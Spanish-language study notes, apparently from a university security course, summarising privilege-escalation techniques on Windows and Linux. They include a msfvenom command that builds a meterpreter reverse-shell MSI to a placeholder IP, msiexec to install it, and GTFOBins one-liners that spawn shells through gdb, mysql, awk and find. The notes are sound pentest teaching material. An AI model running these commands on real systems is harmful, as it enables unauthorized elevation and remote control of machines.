# 5. Elevación de privilegios
## D1n0 - Alejandro Maman INSO3A U-TAD

### Elevación en Windows
Principales técnicas:
- **Unquoted Service Path**: rutas de servicio sin comillas y con espacios → Windows prueba rutas intermedias
- **Permisos inseguros en servicios** (binarios y registro)
- **Secuestro de DLL** (DLL Hijacking): el sistema busca DLLs en este orden:
  1. Directorio de la aplicación
  2. System32
  3. System
  4. C:\Windows
  5. CWD (directorio de trabajo actual)
  6. PATH del sistema
  7. PATH del usuario
- **Always Install Elevated**: permite instalar MSIs con privilegios de SYSTEM
  ```cmd
  reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
  msfvenom -p windows/meterpreter/reverse_tcp lhost=<IP> lport=<puerto> -f msi > payload.msi
  msiexec /quiet /qn /i payload.msi
  ```
- **UAC Bypass**: técnicas fileless o DLL Hijacking en binarios firmados por Microsoft. Proyecto UACMe: https://github.com/hfiref0x/UACME

Scripts automáticos:
- **PowerUp**: https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc/
- **SharpUp** (versión C#): `SharpUp.exe audit`

### Elevación en Linux
Principales técnicas:
- Identificación de credenciales
- Vulnerabilidades en el sistema/kernel
- **Binarios con bit SUID**:
  ```bash
  find / -perm -4000 -type f
  ```
- **Configuración incorrecta de sudo** (Python, Perl, etc.)
- **GTFOBins** (binarios con funcionalidades alternativas):
  ```bash
  gdb -nx -ex '!sh' -ex quit
  mysql -e '! /bin/sh'
  awk 'BEGIN {system("/bin/sh")}'
  find . -exec /bin/sh \; -quit
  ```
  Referencia: https://gtfobins.github.io/
- **Capabilities inseguros en binarios**:
  ```bash
  /usr/bin/getcap -r /usr/bin   # buscar cap_dac_read_search o cap_setuid+ep
  ```

Herramientas automáticas Linux: LinEnum, linuxprivchecker, unix-privesc-checker, BeRoot

---